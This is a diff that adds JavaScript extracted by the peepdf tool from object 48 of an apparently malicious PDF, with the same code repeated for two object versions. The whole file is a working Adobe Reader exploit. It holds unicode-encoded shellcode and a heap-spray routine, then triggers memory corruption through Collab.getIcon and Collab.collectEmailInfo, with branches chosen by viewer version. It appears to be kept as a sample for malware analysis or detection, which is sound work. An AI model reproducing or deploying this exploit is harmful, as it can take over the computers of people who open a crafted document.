@@ -1,0 +1,136 @@
+// peepdf comment: Javascript code located in object 48 (version 2)
+
+function none(a, b) {
+    a + b;
+}
+
+function repeat(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+function myunescape(buf) {
+    var ret = '';
+    for (var x = 0; x < buf.length; x += 2) {
+        ret += util.byteToChar(Number('0x' + buf.substr(x, 2)));
+    }
+    return ret;
+}
+
+var sc = unescape("%u5850%u5850%u5850%u5850%uEB90%u4022%u5F48%u5A57%u8B66%u800A%u30F9%u1A74%uE980%uC064%u04E1%uED80%u8064%u0FE5%uCD02%u0F88%u4242%uEB47%uE8E3%uFFD9%uFFFF");
+
+var sc2 = unescape("%u656c%u7072%u6464%u6c64%u6464%u6464%u646a%u6c72%u6464%u6464%u6464%u6464%u6f69%u656c%u6f72%u706e%u6465%u6468%u6464%u6f72%u6467%u6a65%u696a%u6e73%u6465%u7072%u6b6d%u6764%u7064%u706e%u6c64%u6e71%u6a6b%u716e%u6f6d%u716b%u7371%u6f73%u6b6d%u7173%u7364%u726b%u6c71%u6672%u676b%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u6a6e%u6773%u6566%u646b%u686a%u656e%u6467%u6464%u6464%u6464%u6f6c%u6468%u7064%u6f6c%u646b%u7065%u716e%u6f6c%u6468%u6c64%u6d6c%u676c%u7170%u6465%u6468%u6464%u7073%u716c%u6f6f%u696f%u6465%u6468%u6464%u6767%u6d70%u656f%u6a64%u6c72%u6b66%u6564%u6464%u6464%u676c%u6b70%u6864%u6672%u6a73%u7073%u6767%u6470%u6767%u6671%u6a6a%u6e6f%u7269%u6770%u6f6c%u676f%u6d70%u6465%u6468%u6464%u6a6a%u6f6c%u6a64%u6a6a%u6f67%u6471%u686b%u6864%u6a68%u6a68%u6f72%u6873%u6d6c%u676f%u6572%u6465%u6468%u6464%u6767%u6a73%u716f%u6464%u6466%u6464%u6464%u6f72%u6765%u6e6a%u6464%u6a69%u7373%u676d%u6570%u6465%u6468%u6464%u676c%u6c73%u7373%u686b%u6864%u6f67%u6970%u6b6b%u6d64%u6a68%u656c%u7273%u6464%u6465%u6464%u6464%u666b%u6972%u6d6c%u676f%u6d71%u6465%u6468%u6464%u6f6c%u6c72%u6964%u6464%u6c64%u6464%u6464%u6469%u6e6a%u6468%u7373%u676d%u6d6f%u6465%u6468%u6464%u6d6c%u676c%u6571%u6465%u6468%u6464%u6764%u6970%u6d6c%u676c%u6971%u6465%u6468%u6464%u6e6a%u6464%u6e6a%u6464%u6e6a%u6464%u7373%u676f%u6d71%u6465%u6468%u6464%u7373%u676d%u716f%u6465%u6468%u6464%u6f6c%u676f%u6571%u6465%u6468%u6464%u716c%u6f6f%u7171%u6465%u6468%u6464%u6f6c%u676d%u6d71%u6465%u6468%u6464%u716c%u676c%u6b6f%u6565%u6468%u6464%u6469%u6a69%u6e6a%u6464%u6b69%u6969%u6a69%u6669%u7373%u676f%u6572%u6465%u6468%u6464%u7373%u676e%u696f%u6465%u6468%u6464%u6f64%u6470%u696b%u6664%u6f72%u646a%u6f6c%u676f%u6571%u6465%u6468%u6464%u6f6c%u6a64%u7167%u6966%u6469%u6868%u6a68%u686b%u7064%u6f6c%u676f%u6d71%u6465%u6468%u6464%u6a68%u6d72%u6f69%u7373%u7373%u7373%u6f6c%u676f%u6571%u6465%u6468%u6464%u6767%u6d70%u6e6f%u6e73%u6f73%u7073%u7173%u6f72%u6c64%u6f6c%u6a64%u6f67%u6670%u686b%u6a64%u6a68%u6568%u6f67%u7170%u666b%u6873%u676c%u6a70%u6864%u6f6c%u6f6f%u6971%u6465%u6468%u6464%u6d6f%u6464%u6b64%u6464%u6464%u686e%u6672%u7173%u6f6c%u6f6f%u6571%u6465%u6468%u6464%u7373%u676f%u6d71%u6465%u6468%u6464%u7373%u676d%u6970%u6465%u6468%u6464%u7373%u676f%u6971%u6465%u6468%u6464%u6770%u7373%u676f%u6d71%u6465%u6468%u6464%u7373%u676d%u6970%u6465%u6468%u6464%u6e6a%u6464%u7373%u676d%u6d70%u6465%u6468%u6464%u6770%u646a%u6f6c%u676f%u7170%u6465%u6468%u6464%u6764%u6a6b%u7067%u6f6c%u6a6b%u6c6b%u6764%u676f%u7170%u6465%u6468%u6464%u6a69%u6f6c%u7268%u6c65%u6f6c%u6a6b%u6466%u6764%u676f%u7170%u6465%u6468%u6464%u6767%u6470%u6767%u6671%u6a69%u6f6c%u6a67%u6764%u676f%u7170%u6465%u6468%u6464%u706e%u6c67%u6472%u686b%u6b64%u6570%u6e70%u7164%u6764%u6471%u6f72%u6873%u6f67%u6b65%u686b%u6d64%u7269%u676c%u6a70%u6864%u6d68%u686b%u6967%u6f72%u7071%u7269%u6f6c%u6a71%u7269%u6f66%u6a69%u6466%u6f66%u676d%u7170%u6465%u6468%u6464%u6571%u6e72%u6764%u6a69%u6866%u6764%u676d%u7170%u6465%u6468%u6464%u7364%u6b6f%u6664%u6570%u6472%u6664%u6764%u6a68%u7065%u6764%u676c%u7170%u6465%u6468%u6464%u6f6c%u6464%u6764%u676c%u7170%u6465%u6468%u6464%u6d6c%u6b64%u6f72%u6564%u7269%u656a%u6770%u3030");
+
+function exploit() {
+    blah = repeat(128, unescape("%u4647%u4a4b%u4849%u4647%u4849")) + sc + sc2;
+    bigblock = unescape("%u4a4b%u4647");
+    headersize = 20;
+    wap = headersize + blah.length;
+    while (bigblock.length < wap) bigblock += bigblock;
+    fillblock = bigblock.substring(0, wap);
+    block = bigblock.substring(0, bigblock.length - wap);
+    while (block.length + wap < 0x40000) block = block + block + fillblock;
+    mm = new Array();
+    for (i = 0; i < 200; i++) mm[i] = block + blah;
+    of = repeat(4096, myunescape("0a0a0a0a"));
+    var a = ["_N.bundle"]; //javascript comment
+    Collab["getIcon"](of + a[0x0]);
+}
+
+function start() {
+    if (app.viewerVersion >= 7.0) {
+        plin = repeat(1124, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%u4346%u4a4b") + repeat(122, unescape("%u0b0b%u0028%u06eb%u06eb")) + sc + sc2 + repeat(1256, unescape("%u4a4b%u4748"));
+    } else {
+        ef6 = unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");
+        plin = repeat(80, unescape("%u4141%u4141")) + sc + sc2 + repeat(80, unescape("%u4241%u4142")) + unescape("%uf7e9%ufff9") + unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");
+        while ((plin.length % 8) != 0)
+        plin = unescape("%u4141") + plin;
+
+        plin += repeat(2626, ef6);
+    }
+    if (app.viewerVersion >= 6.0) {
+        var a = []; //javascript for adobe
+        Collab["collectEmailInfo"]({
+            subj: a[0x0],
+            msg: plin
+        });
+    }
+}
+
+if (app.viewerVersion >= 8.0) {
+    var inBrowser = this.external;
+    if (inBrowser) var shaft = app.setTimeOut("exploit()", 1200);
+    else exploit();
+} else {
+    var shaft = app.setTimeOut("start()", 1200);
+}
+
+// peepdf comment: Javascript code located in object 48 (version 5)
+
+function none(a, b) {
+    a + b;
+}
+
+function repeat(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+function myunescape(buf) {
+    var ret = '';
+    for (var x = 0; x < buf.length; x += 2) {
+        ret += util.byteToChar(Number('0x' + buf.substr(x, 2)));
+    }
+    return ret;
+}
+
+var sc = unescape("%u5850%u5850%u5850%u5850%uEB90%u4022%u5F48%u5A57%u8B66%u800A%u30F9%u1A74%uE980%uC064%u04E1%uED80%u8064%u0FE5%uCD02%u0F88%u4242%uEB47%uE8E3%uFFD9%uFFFF");
+
+var sc2 = unescape("%u656c%u7072%u6464%u6c64%u6464%u6464%u646a%u6c72%u6464%u6464%u6464%u6464%u6f69%u656c%u6f72%u706e%u6465%u6468%u6464%u6f72%u6467%u6a65%u696a%u6e73%u6465%u7072%u6b6d%u6764%u7064%u706e%u6c64%u6e71%u6a6b%u716e%u6f6d%u716b%u7371%u6f73%u6b6d%u7173%u7364%u726b%u6c71%u6672%u676b%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u7373%u6a6e%u6773%u6566%u646b%u686a%u656e%u6467%u6464%u6464%u6464%u6f6c%u6468%u7064%u6f6c%u646b%u7065%u716e%u6f6c%u6468%u6c64%u6d6c%u676c%u7170%u6465%u6468%u6464%u7073%u716c%u6f6f%u696f%u6465%u6468%u6464%u6767%u6d70%u656f%u6a64%u6c72%u6b66%u6564%u6464%u6464%u676c%u6b70%u6864%u6672%u6a73%u7073%u6767%u6470%u6767%u6671%u6a6a%u6e6f%u7269%u6770%u6f6c%u676f%u6d70%u6465%u6468%u6464%u6a6a%u6f6c%u6a64%u6a6a%u6f67%u6471%u686b%u6864%u6a68%u6a68%u6f72%u6873%u6d6c%u676f%u6572%u6465%u6468%u6464%u6767%u6a73%u716f%u6464%u6466%u6464%u6464%u6f72%u6765%u6e6a%u6464%u6a69%u7373%u676d%u6570%u6465%u6468%u6464%u676c%u6c73%u7373%u686b%u6864%u6f67%u6970%u6b6b%u6d64%u6a68%u656c%u7273%u6464%u6465%u6464%u6464%u666b%u6972%u6d6c%u676f%u6d71%u6465%u6468%u6464%u6f6c%u6c72%u6964%u6464%u6c64%u6464%u6464%u6469%u6e6a%u6468%u7373%u676d%u6d6f%u6465%u6468%u6464%u6d6c%u676c%u6571%u6465%u6468%u6464%u6764%u6970%u6d6c%u676c%u6971%u6465%u6468%u6464%u6e6a%u6464%u6e6a%u6464%u6e6a%u6464%u7373%u676f%u6d71%u6465%u6468%u6464%u7373%u676d%u716f%u6465%u6468%u6464%u6f6c%u676f%u6571%u6465%u6468%u6464%u716c%u6f6f%u7171%u6465%u6468%u6464%u6f6c%u676d%u6d71%u6465%u6468%u6464%u716c%u676c%u6b6f%u6565%u6468%u6464%u6469%u6a69%u6e6a%u6464%u6b69%u6969%u6a69%u6669%u7373%u676f%u6572%u6465%u6468%u6464%u7373%u676e%u696f%u6465%u6468%u6464%u6f64%u6470%u696b%u6664%u6f72%u646a%u6f6c%u676f%u6571%u6465%u6468%u6464%u6f6c%u6a64%u7167%u6966%u6469%u6868%u6a68%u686b%u7064%u6f6c%u676f%u6d71%u6465%u6468%u6464%u6a68%u6d72%u6f69%u7373%u7373%u7373%u6f6c%u676f%u6571%u6465%u6468%u6464%u6767%u6d70%u6e6f%u6e73%u6f73%u7073%u7173%u6f72%u6c64%u6f6c%u6a64%u6f67%u6670%u686b%u6a64%u6a68%u6568%u6f67%u7170%u666b%u6873%u676c%u6a70%u6864%u6f6c%u6f6f%u6971%u6465%u6468%u6464%u6d6f%u6464%u6b64%u6464%u6464%u686e%u6672%u7173%u6f6c%u6f6f%u6571%u6465%u6468%u6464%u7373%u676f%u6d71%u6465%u6468%u6464%u7373%u676d%u6970%u6465%u6468%u6464%u7373%u676f%u6971%u6465%u6468%u6464%u6770%u7373%u676f%u6d71%u6465%u6468%u6464%u7373%u676d%u6970%u6465%u6468%u6464%u6e6a%u6464%u7373%u676d%u6d70%u6465%u6468%u6464%u6770%u646a%u6f6c%u676f%u7170%u6465%u6468%u6464%u6764%u6a6b%u7067%u6f6c%u6a6b%u6c6b%u6764%u676f%u7170%u6465%u6468%u6464%u6a69%u6f6c%u7268%u6c65%u6f6c%u6a6b%u6466%u6764%u676f%u7170%u6465%u6468%u6464%u6767%u6470%u6767%u6671%u6a69%u6f6c%u6a67%u6764%u676f%u7170%u6465%u6468%u6464%u706e%u6c67%u6472%u686b%u6b64%u6570%u6e70%u7164%u6764%u6471%u6f72%u6873%u6f67%u6b65%u686b%u6d64%u7269%u676c%u6a70%u6864%u6d68%u686b%u6967%u6f72%u7071%u7269%u6f6c%u6a71%u7269%u6f66%u6a69%u6466%u6f66%u676d%u7170%u6465%u6468%u6464%u6571%u6e72%u6764%u6a69%u6866%u6764%u676d%u7170%u6465%u6468%u6464%u7364%u6b6f%u6664%u6570%u6472%u6664%u6764%u6a68%u7065%u6764%u676c%u7170%u6465%u6468%u6464%u6f6c%u6464%u6764%u676c%u7170%u6465%u6468%u6464%u6d6c%u6b64%u6f72%u6564%u7269%u656a%u6770%u3030");
+
+function exploit() {
+    blah = repeat(128, unescape("%u4647%u4a4b%u4849%u4647%u4849")) + sc + sc2;
+    bigblock = unescape("%u4a4b%u4647");
+    headersize = 20;
+    wap = headersize + blah.length;
+    while (bigblock.length < wap) bigblock += bigblock;
+    fillblock = bigblock.substring(0, wap);
+    block = bigblock.substring(0, bigblock.length - wap);
+    while (block.length + wap < 0x40000) block = block + block + fillblock;
+    mm = new Array();
+    for (i = 0; i < 200; i++) mm[i] = block + blah;
+    of = repeat(4096, myunescape("0a0a0a0a"));
+    var a = ["_N.bundle"]; //javascript comment
+    Collab["getIcon"](of + a[0x0]);
+}
+
+function start() {
+    if (app.viewerVersion >= 7.0) {
+        plin = repeat(1124, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%u4346%u4a4b") + repeat(122, unescape("%u0b0b%u0028%u06eb%u06eb")) + sc + sc2 + repeat(1256, unescape("%u4a4b%u4748"));
+    } else {
+        ef6 = unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");
+        plin = repeat(80, unescape("%u4141%u4141")) + sc + sc2 + repeat(80, unescape("%u4241%u4142")) + unescape("%uf7e9%ufff9") + unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");
+        while ((plin.length % 8) != 0)
+        plin = unescape("%u4141") + plin;
+
+        plin += repeat(2626, ef6);
+    }
+    if (app.viewerVersion >= 6.0) {
+        var a = []; //javascript for adobe
+        Collab["collectEmailInfo"]({
+            subj: a[0x0],
+            msg: plin
+        });
+    }
+}
+
+if (app.viewerVersion >= 8.0) {
+    var inBrowser = this.external;
+    if (inBrowser) var shaft = app.setTimeOut("exploit()", 1200);
+    else exploit();
+} else {
+    var shaft = app.setTimeOut("start()", 1200);
+}
+
